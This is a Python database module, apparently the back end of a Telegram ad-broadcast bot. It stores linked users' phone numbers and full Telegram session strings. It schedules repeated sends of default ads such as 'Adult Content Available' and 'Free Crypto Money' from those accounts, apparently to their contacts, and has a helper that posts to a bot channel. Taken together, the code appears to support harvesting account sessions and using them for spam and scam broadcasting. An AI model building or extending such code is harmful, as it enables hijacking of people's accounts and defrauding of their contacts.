import os
import time
import uuid
import threading
import html as _html
from datetime import datetime, timedelta

import requests
from pymongo import MongoClient, ASCENDING, DESCENDING, ReturnDocument
from pymongo.errors import PyMongoError

from config import (
    MONGODB_URI, DB_NAME, BOT_TOKEN, CHANNEL_ID,
    DEFAULT_INTERVAL_SEC, UPLOAD_FOLDER,
)
from Nexa.logs import info, warn, error

# ---------------------------------------------------------------- state

mongo_client = None
db = None
db_connected = False

users_col = None
ads_config_col = None
temp_sessions_col = None
ads_logs_col = None
broadcast_msgs_col = None

_config_lock = threading.RLock()
_db_lock = threading.RLock()

_last_ping = 0.0
_PING_INTERVAL = 30

ALLOWED_IMAGE_EXT = {"png", "jpg", "jpeg", "gif", "webp", "bmp"}
ALLOWED_VIDEO_EXT = {"mp4", "mov", "avi", "mkv", "webm", "m4v", "3gp"}
ALLOWED_EXT       = ALLOWED_IMAGE_EXT | ALLOWED_VIDEO_EXT

VIDEO_SLOTS = 5

DEFAULT_ADS = [
    {"id": "ad1", "kind": "link", "text": "Adult Content Available",
     "url": "https://example.com/adult", "enabled": True},
    {"id": "ad2", "kind": "link", "text": "Free Crypto Money",
     "url": "https://example.com/crypto", "enabled": True},
]

DEFAULT_VIDEOS = [{"title": f"Video {i + 1}", "url": ""} for i in range(VIDEO_SLOTS)]

_CFG_DEFAULTS = {
    "ads_enabled": False,
    "interval": DEFAULT_INTERVAL_SEC,
    "caption": "",
    "caption_is_html": False,
    "media_path": None,
    "media_type": None,
    "photo_path": None,
    "delete_after_round": True,
    "next_broadcast_at": None,
    "total_broadcasts": 0,
    "last_broadcast_at": None,
}


# ---------------------------------------------------------------- helpers

def _as_bool(value, default=False):
    if isinstance(value, bool):
        return value
    if value is None:
        return default
    return str(value).strip().lower() in ("1", "true", "yes", "on")


def _safe(fn, default=None, label="db op"):
    try:
        return fn()
    except PyMongoError as exc:
        warn(f"{label} failed: {type(exc).__name__}: {exc}", source="db")
    except Exception as exc:
        warn(f"{label} failed: {type(exc).__name__}: {exc}", source="db")
    return default


def _default_config():
    config = {"_id": "main_config", "updated_at": datetime.now()}
    config.update(_CFG_DEFAULTS)
    config["ads"] = [dict(ad) for ad in DEFAULT_ADS]
    config["videos"] = [dict(v) for v in DEFAULT_VIDEOS]
    return config


def _normalize_ad(ad):
    """Migrate every historical ad shape into the current one.
    New ads are text links; old inline-button ads keep kind='button' so the
    admin panel can offer a one-click conversion."""
    ad = dict(ad or {})
    if not ad.get("id"):
        ad["id"] = uuid.uuid4().hex[:8]
    ad.setdefault("enabled", True)

    kind = ad.get("kind")
    if kind == "link":
        ad["text"] = ad.get("text") or ad.get("label") or ""
        ad.pop("label", None)
        ad.pop("has_button", None)
        return ad
    if kind == "button":
        ad["label"] = ad.get("label") or ad.get("text") or ""
        return ad

    # legacy shapes: {has_button, label, url}
    if ad.get("has_button"):
        return {"id": ad["id"], "kind": "button",
                "label": ad.get("label", ""), "url": ad.get("url", ""),
                "enabled": ad.get("enabled", True)}
    return {"id": ad["id"], "kind": "link",
            "text": ad.get("text") or ad.get("label", ""),
            "url": ad.get("url", ""), "enabled": ad.get("enabled", True)}


def _ensure_indexes():
    """Create indexes. Never raises - a bad index must not kill a live
    connection (this used to catch only PyMongoError, so an AttributeError on
    a not-yet-bound collection tore down the whole client)."""
    try:
        if users_col is not None:
            users_col.create_index([("phone", ASCENDING)])
            users_col.create_index([("user_id", ASCENDING)])
            users_col.create_index([("ads_enabled", ASCENDING)])
            users_col.create_index([("next_ad_time", ASCENDING)])
            users_col.create_index([("ads_enabled", ASCENDING),
                                    ("next_ad_time", ASCENDING)])
            users_col.create_index([("created_at", DESCENDING)])
        if temp_sessions_col is not None:
            temp_sessions_col.create_index([("created_at", ASCENDING)])
        if broadcast_msgs_col is not None:
            broadcast_msgs_col.create_index([("broadcast_id", ASCENDING)])
            broadcast_msgs_col.create_index([("user_id", ASCENDING)])
    except Exception as exc:
        warn(f"index creation failed: {type(exc).__name__}: {exc}", source="db")


def _bind(database):
    """Bind every collection handle from a live database object."""
    global users_col, ads_config_col, temp_sessions_col, ads_logs_col, broadcast_msgs_col
    users_col = database.users
    ads_config_col = database.ads_config
    temp_sessions_col = database.temp_sessions
    ads_logs_col = database.ads_logs
    broadcast_msgs_col = database.broadcast_msgs


def _unbind():
    global users_col, ads_config_col, temp_sessions_col, ads_logs_col, broadcast_msgs_col
    users_col = ads_config_col = temp_sessions_col = None
    ads_logs_col = broadcast_msgs_col = None


# ---------------------------------------------------------------- connect

def _connect():
    global mongo_client, db, db_connected, _last_ping

    with _db_lock:
        old_client = mongo_client
        mongo_client = None
        db = None
        db_connected = False
        _unbind()

        if old_client is not None:
            try:
                old_client.close()
            except Exception:
                pass

        if not MONGODB_URI:
            error("MONGODB_URI is not configured", source="db")
            _last_ping = time.time()
            return False

        client = None
        try:
            client = MongoClient(
                MONGODB_URI,
                serverSelectionTimeoutMS=5000,
                connectTimeoutMS=5000,
                socketTimeoutMS=15000,
                retryWrites=True,
                maxPoolSize=50,
            )
            database = client[DB_NAME]
            client.admin.command("ping")

            # Only publish the new state once the connection is proven good.
            mongo_client = client
            db = database
            _bind(database)
            db_connected = True
            _last_ping = time.time()

            info("MongoDB connected", source="db")
            _ensure_indexes()          # cannot raise now
            return True

        except Exception as exc:
            error(f"MongoDB connection failed: {type(exc).__name__}: {exc}", source="db")
            if client is not None:
                try:
                    client.close()
                except Exception:
                    pass
            mongo_client = None
            db = None
            db_connected = False
            _unbind()
            _last_ping = time.time()
            return False


def ensure_db():
    global _last_ping, db_connected
    with _db_lock:
        now = time.time()
        if mongo_client is None or not db_connected:
            return _connect()
        if now - _last_ping < _PING_INTERVAL:
            return True
        try:
            mongo_client.admin.command("ping")
            db_connected = True
            _last_ping = time.time()
            return True
        except Exception as exc:
            warn(f"MongoDB ping failed: {exc}", source="db")
            return _connect()


def init_db():
    return _connect()


def ping():
    """Force a live round-trip. Returns True/False."""
    global _last_ping
    if mongo_client is None:
        return _connect()
    try:
        mongo_client.admin.command("ping")
        _last_ping = time.time()
        return True
    except Exception:
        return _connect()


def is_connected():
    return bool(db_connected and mongo_client is not None)


# ---------------------------------------------------------------- accessors

def get_users_col():          return users_col
def get_ads_config_col():     return ads_config_col
def get_temp_sessions_col():  return temp_sessions_col
def get_broadcast_msgs_col(): return broadcast_msgs_col
def get_ads_logs_col():       return ads_logs_col


def db_status():
    return {
        "connected": is_connected(),
        "has_users_col": users_col is not None,
        "has_config_col": ads_config_col is not None,
        "has_msgs_col": broadcast_msgs_col is not None,
        "uri_configured": bool(MONGODB_URI),
        "db_name": DB_NAME,
    }


# ---------------------------------------------------------------- files

def allowed_file(filename):
    return bool(filename) and "." in filename and \
        filename.rsplit(".", 1)[1].lower() in ALLOWED_EXT


def media_kind(filename):
    if not filename or "." not in filename:
        return None
    ext = filename.rsplit(".", 1)[1].lower()
    if ext in ALLOWED_VIDEO_EXT:
        return "video"
    if ext in ALLOWED_IMAGE_EXT:
        return "photo"
    return None


def media_exists(path):
    """True if the file is reachable at any plausible location."""
    if not path or not isinstance(path, str):
        return False
    base = os.path.basename(path)
    for cand in (path, os.path.join(UPLOAD_FOLDER, base),
                 os.path.join(os.getcwd(), base)):
        try:
            if cand and os.path.isfile(cand):
                return True
        except (OSError, ValueError):
            continue
    return False


def delete_photo_file(path):
    try:
        if path and os.path.isfile(path):
            os.remove(path)
    except OSError as exc:
        warn(f"could not delete {path}: {exc}", source="db")


def escape_text(value):
    return _html.escape(value or "", quote=False)


# ---------------------------------------------------------------- sessions

def save_session_to_db(session_data):
    """Upsert a linked account. A brand new account gets its first ad after
    exactly one interval, then repeats on that interval."""
    if not ensure_db() or users_col is None:
        return False
    try:
        interval = int(get_ads_config().get("interval") or DEFAULT_INTERVAL_SEC)
        interval = max(60, interval)
        now = datetime.now()
        phone = session_data["phone"]
        payload = {
            "session_string": session_data["session_string"],
            "updated_at": now,
            "user_id": session_data["id"],
            "username": session_data.get("username"),
            "first_name": session_data.get("first_name", ""),
            "last_name": session_data.get("last_name", ""),
            "status": "active",
        }

        existing = users_col.find_one({"phone": phone})
        if existing:
            users_col.update_one({"_id": existing["_id"]}, {"$set": payload})
            if not existing.get("next_ad_time"):
                users_col.update_one(
                    {"_id": existing["_id"]},
                    {"$set": {"next_ad_time": now + timedelta(seconds=interval)}},
                )
            info(f"session refreshed for {phone}", source="db")
            return str(existing["_id"])

        payload.update({
            "phone": phone,
            "session_name": session_data.get("session_name"),
            "created_at": now,
            "next_ad_time": now + timedelta(seconds=interval),
            "ads_enabled": True,
            "last_ad_time": None,
            "deliveries": 0,
            "failures": 0,
            "contact_offset": 0,
        })
        result = users_col.insert_one(payload)
        info(f"new session stored for {phone} "
             f"(first ad in {interval // 60} min)", source="db")
        return str(result.inserted_id)

    except (PyMongoError, KeyError, TypeError) as exc:
        error(f"save_session failed: {type(exc).__name__}: {exc}", source="db")
        return False


def backfill_next_ad_time():
    """Anyone missing a schedule becomes due immediately, once."""
    if not ensure_db() or users_col is None:
        return 0
    try:
        r = users_col.update_many(
            {"next_ad_time": {"$in": [None]}, "$or": [{"next_ad_time": {"$exists": False}}]},
            {"$set": {"next_ad_time": datetime.now()}},
        )
        r2 = users_col.update_many(
            {"next_ad_time": None},
            {"$set": {"next_ad_time": datetime.now()}},
        )
        return r.modified_count + r2.modified_count
    except PyMongoError as exc:
        warn(f"backfill failed: {exc}", source="db")
        return 0


def reschedule_all_after_interval_change(interval_sec):
    if not ensure_db() or users_col is None:
        return 0
    try:
        cap = datetime.now() + timedelta(seconds=interval_sec)
        r = users_col.update_many(
            {"next_ad_time": {"$gt": cap}},
            {"$set": {"next_ad_time": cap}},
        )
        # users with no schedule at all should also respect the new cap
        r2 = users_col.update_many(
            {"next_ad_time": None},
            {"$set": {"next_ad_time": cap}},
        )
        return r.modified_count + r2.modified_count
    except PyMongoError as exc:
        warn(f"reschedule failed: {exc}", source="db")
        return 0


def pull_schedule_forward(max_wait_sec=90, new_wait_sec=30):
    """After a content change, pull pending sends forward so the next tick
    picks it up instead of waiting a whole interval."""
    if not ensure_db() or users_col is None:
        return 0
    try:
        cutoff = datetime.now() + timedelta(seconds=max_wait_sec)
        target = datetime.now() + timedelta(seconds=new_wait_sec)
        r = users_col.update_many(
            {"ads_enabled": True, "next_ad_time": {"$gt": cutoff}},
            {"$set": {"next_ad_time": target}},
        )
        return r.modified_count
    except PyMongoError as exc:
        warn(f"pull_schedule_forward failed: {exc}", source="db")
        return 0


def queue_all_now():
    """Make every subscribed user due right now."""
    if not ensure_db() or users_col is None:
        return 0
    try:
        r = users_col.update_many({"ads_enabled": True},
                                  {"$set": {"next_ad_time": datetime.now()}})
        return r.modified_count
    except PyMongoError as exc:
        warn(f"queue_all_now failed: {exc}", source="db")
        return 0


def get_due_users(limit=500):
    if not ensure_db() or users_col is None:
        return []
    try:
        return list(users_col.find({
            "ads_enabled": True,
            "next_ad_time": {"$lte": datetime.now()},
        }).limit(limit))
    except PyMongoError as exc:
        warn(f"get_due_users failed: {exc}", source="db")
        return []


def get_user_by_oid(oid):
    if not ensure_db() or users_col is None:
        return None
    try:
        return users_col.find_one({"_id": oid})
    except PyMongoError:
        return None


def set_user_ads_enabled(oid, enabled):
    if not ensure_db() or users_col is None:
        return False
    try:
        users_col.update_one({"_id": oid}, {"$set": {"ads_enabled": bool(enabled)}})
        return True
    except PyMongoError:
        return False


def set_user_next_ad_time(oid, when):
    if not ensure_db() or users_col is None:
        return False
    try:
        users_col.update_one({"_id": oid}, {"$set": {"next_ad_time": when}})
        return True
    except PyMongoError:
        return False


def mark_user_expired(oid):
    if not ensure_db() or users_col is None:
        return False
    try:
        users_col.update_one({"_id": oid},
                             {"$set": {"ads_enabled": False, "status": "expired"}})
        return True
    except PyMongoError:
        return False


# ---------------------------------------------------------------- counters

def count_users():
    if not ensure_db() or users_col is None:
        return 0
    return _safe(lambda: users_col.count_documents({}), 0, "count_users")


def count_subscribed():
    if not ensure_db() or users_col is None:
        return 0
    return _safe(lambda: users_col.count_documents({"ads_enabled": True}),
                 0, "count_subscribed")


def count_users_missing_session():
    if not ensure_db() or users_col is None:
        return 0
    return _safe(lambda: users_col.count_documents({
        "$or": [{"session_string": {"$exists": False}},
                {"session_string": None},
                {"session_string": ""}],
    }), 0, "count_users_missing_session")


def count_due_now():
    if not ensure_db() or users_col is None:
        return 0
    return _safe(lambda: users_col.count_documents({
        "ads_enabled": True,
        "next_ad_time": {"$lte": datetime.now()},
    }), 0, "count_due_now")


def count_pending_messages():
    if not ensure_db() or broadcast_msgs_col is None:
        return 0
    return _safe(lambda: broadcast_msgs_col.count_documents({}),
                 0, "count_pending_messages")


# ---------------------------------------------------------------- config

def _new_config_doc():
    doc = {
        "updated_at": datetime.now(),
        "ads": [dict(ad) for ad in DEFAULT_ADS],
        "videos": [dict(v) for v in DEFAULT_VIDEOS],
    }
    doc.update(_CFG_DEFAULTS)
    return doc


def get_ads_config():
    if not ensure_db() or ads_config_col is None:
        return _default_config()
    try:
        # Atomic create-and-return: no read-then-write race, and _id stays out
        # of $setOnInsert so there is no field conflict.
        config = ads_config_col.find_one_and_update(
            {"_id": "main_config"},
            {"$setOnInsert": _new_config_doc()},
            upsert=True,
            return_document=ReturnDocument.AFTER,
        )
        if not config:
            return _default_config()

        for key, value in _CFG_DEFAULTS.items():
            config.setdefault(key, value)

        # Coerce types so callers can trust them.
        config["ads_enabled"] = _as_bool(config.get("ads_enabled"), False)
        config["caption_is_html"] = _as_bool(config.get("caption_is_html"), False)
        config["delete_after_round"] = _as_bool(config.get("delete_after_round"), True)
        try:
            config["interval"] = max(60, int(config.get("interval") or DEFAULT_INTERVAL_SEC))
        except (TypeError, ValueError):
            config["interval"] = DEFAULT_INTERVAL_SEC

        ads = config.get("ads")
        if not isinstance(ads, list):
            ads = [dict(a) for a in DEFAULT_ADS]
        config["ads"] = [_normalize_ad(a) for a in ads]

        vids = list(config.get("videos") or [])
        while len(vids) < VIDEO_SLOTS:
            vids.append({"title": f"Video {len(vids) + 1}", "url": ""})
        config["videos"] = vids[:VIDEO_SLOTS]

        if not config.get("media_path") and config.get("photo_path"):
            config["media_path"] = config["photo_path"]
        if not config.get("media_type") and config.get("media_path"):
            config["media_type"] = media_kind(config["media_path"]) or "photo"
        if config.get("media_type") not in ("photo", "video"):
            config["media_type"] = "photo"

        return config

    except PyMongoError as exc:
        warn(f"get_ads_config failed: {exc}", source="db")
        return _default_config()


def update_ads_config(updates):
    """Write config fields and report whether the write actually landed."""
    if not ensure_db() or ads_config_col is None:
        return False
    updates = dict(updates)
    updates.pop("_id", None)
    updates["updated_at"] = datetime.now()
    try:
        with _config_lock:
            result = ads_config_col.update_one(
                {"_id": "main_config"},
                {"$set": updates},
                upsert=True,
            )
        # matched_count == 0 AND no upsert means nothing happened.
        return bool(result.matched_count or result.upserted_id)
    except PyMongoError as exc:
        error(f"update_ads_config failed: {exc}", source="db")
        return False


def inc_ads_config(field, amount=1):
    if not ensure_db() or ads_config_col is None:
        return False
    if (not isinstance(field, str) or not field or field == "_id"
            or field.startswith("$") or "." in field):
        return False
    try:
        ads_config_col.update_one({"_id": "main_config"},
                                  {"$inc": {field: amount}}, upsert=True)
        return True
    except PyMongoError as exc:
        warn(f"inc_ads_config failed: {exc}", source="db")
        return False


def set_delete_after_round(enabled):
    """Atomic, read-back-verified setter for the delete-after-round flag.
    Returns the persisted value, or None on failure."""
    if not update_ads_config({"delete_after_round": bool(enabled)}):
        return None
    return _as_bool((get_ads_config() or {}).get("delete_after_round"), False)


def get_delete_after_round():
    return _as_bool((get_ads_config() or {}).get("delete_after_round"), True)


def mutate_ads(mutator):
    """Atomic read-modify-write of the ads array."""
    with _config_lock:
        config = get_ads_config()
        ads = [_normalize_ad(a) for a in config.get("ads", [])]
        new_ads = mutator(ads)
        if new_ads is None:
            return None
        if update_ads_config({"ads": new_ads}):
            return new_ads
        return None


def active_link_count():
    cfg = get_ads_config()
    n = 0
    for a in cfg.get("ads", []):
        if a.get("enabled", True) and (a.get("url") or "").startswith("http"):
            n += 1
    return n


def reset_ads_config():
    config = get_ads_config()
    old_media = config.get("media_path") or config.get("photo_path")
    success = update_ads_config({
        "ads": [dict(ad) for ad in DEFAULT_ADS],
        "caption": "",
        "caption_is_html": False,
        "media_path": None,
        "media_type": None,
        "photo_path": None,
    })
    return old_media if success else None


# ---------------------------------------------------------------- videos

def get_videos():
    config = get_ads_config()
    vids = config.get("videos") or []
    out = []
    for i in range(VIDEO_SLOTS):
        v = vids[i] if i < len(vids) else {}
        out.append({
            "slot": i + 1,
            "title": (v.get("title") or f"Video {i + 1}").strip(),
            "url": (v.get("url") or "").strip(),
        })
    return out


def update_videos(videos):
    normalized = []
    for i in range(VIDEO_SLOTS):
        v = videos[i] if i < len(videos) else {}
        normalized.append({
            "title": (v.get("title") or f"Video {i + 1}").strip()[:80],
            "url": (v.get("url") or "").strip(),
        })
    return update_ads_config({"videos": normalized})


# ---------------------------------------------------------------- stats

def get_stats():
    empty = {
        "total_users": 0, "active_users": 0, "idle_users": 0,
        "opted_in": 0, "total_deliveries": 0, "total_broadcasts": 0,
        "db_connected": False, "active_sessions": 0, "pending_msgs": 0,
        "online_users": 0, "recent_users": 0,
        "last_broadcast_at": None, "next_broadcast_at": None,
        "broadcast_mode_users": 0, "registered_today": 0,
        "users_without_session": 0, "due_now": 0,
    }
    if not ensure_db() or users_col is None:
        return empty
    try:
        total    = users_col.count_documents({})
        active   = users_col.count_documents({"status": "active"})
        idle     = users_col.count_documents({"status": "idle"})
        opted_in = users_col.count_documents({"ads_enabled": True})

        agg = list(users_col.aggregate([{
            "$group": {
                "_id": None,
                "d": {"$sum": {"$ifNull": ["$deliveries", 0]}},
                "f": {"$sum": {"$ifNull": ["$failures", 0]}},
            }
        }]))
        deliveries = agg[0]["d"] if agg else 0

        yesterday = datetime.now() - timedelta(days=1)
        recent = users_col.count_documents({"created_at": {"$gte": yesterday}})

        last_hour = datetime.now() - timedelta(hours=1)
        online = users_col.count_documents({"last_ad_time": {"$gte": last_hour}})

        pending = (broadcast_msgs_col.count_documents({})
                   if broadcast_msgs_col is not None else 0)

        today_start = datetime.now().replace(hour=0, minute=0, second=0, microsecond=0)
        registered_today = users_col.count_documents({"created_at": {"$gte": today_start}})

        config = get_ads_config()

        return {
            "total_users": total,
            "active_users": active,
            "idle_users": idle,
            "opted_in": opted_in,
            "total_deliveries": deliveries,
            "total_broadcasts": config.get("total_broadcasts", 0),
            "online_users": online,
            "recent_users": recent,
            "pending_msgs": pending,
            "db_connected": db_connected,
            "active_sessions": 0,
            "last_broadcast_at": config.get("last_broadcast_at"),
            "next_broadcast_at": config.get("next_broadcast_at"),
            "broadcast_mode_users": opted_in,
            "registered_today": registered_today,
            "users_without_session": count_users_missing_session(),
            "due_now": count_due_now(),
        }
    except PyMongoError as exc:
        warn(f"get_stats failed: {exc}", source="db")
        return empty


def get_all_users(limit=500):
    if not ensure_db() or users_col is None:
        return []
    try:
        output = []
        cursor = users_col.find().sort("created_at", DESCENDING).limit(limit)
        for user in cursor:
            ca = user.get("created_at")
            la = user.get("last_ad_time")
            na = user.get("next_ad_time")
            output.append({
                "id": str(user.get("_id")),
                "user_id": user.get("user_id"),
                "name": f"{user.get('first_name', '')} {user.get('last_name', '')}".strip(),
                "username": user.get("username") or "N/A",
                "phone": user.get("phone") or "N/A",
                "status": user.get("status", "unknown"),
                "ads_enabled": user.get("ads_enabled", True),
                "has_session": bool(user.get("session_string")),
                "deliveries": user.get("deliveries", 0),
                "failures": user.get("failures", 0),
                "created_at": ca.strftime("%Y-%m-%d %H:%M") if isinstance(ca, datetime) else "N/A",
                "last_ad_time": la.strftime("%Y-%m-%d %H:%M") if isinstance(la, datetime) else "Never",
                "next_ad_time": na.strftime("%Y-%m-%d %H:%M") if isinstance(na, datetime) else "N/A",
            })
        return output
    except PyMongoError as exc:
        warn(f"get_all_users failed: {exc}", source="db")
        return []


def clear_broadcast_messages():
    if not ensure_db() or broadcast_msgs_col is None:
        return 0
    try:
        n = broadcast_msgs_col.count_documents({})
        broadcast_msgs_col.delete_many({})
        return n
    except PyMongoError as exc:
        warn(f"clear_broadcast_messages failed: {exc}", source="db")
        return 0


# ---------------------------------------------------------------- telegram

def send_to_channel(message):
    if not BOT_TOKEN:
        warn("BOT_TOKEN not configured", source="db")
        return False
    try:
        response = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            json={
                "chat_id": CHANNEL_ID,
                "text": message,
                "parse_mode": "HTML",
                "disable_web_page_preview": True,
            },
            timeout=10,
        )
        if response.status_code != 200:
            warn(f"telegram HTTP {response.status_code}", source="db")
            return False
        result = response.json()
        if not result.get("ok"):
            warn(f"telegram API error: {result}", source="db")
        return result.get("ok", False)
    except (requests.RequestException, ValueError) as exc:
        warn(f"telegram channel error: {exc}", source="db")
        return False


init_db()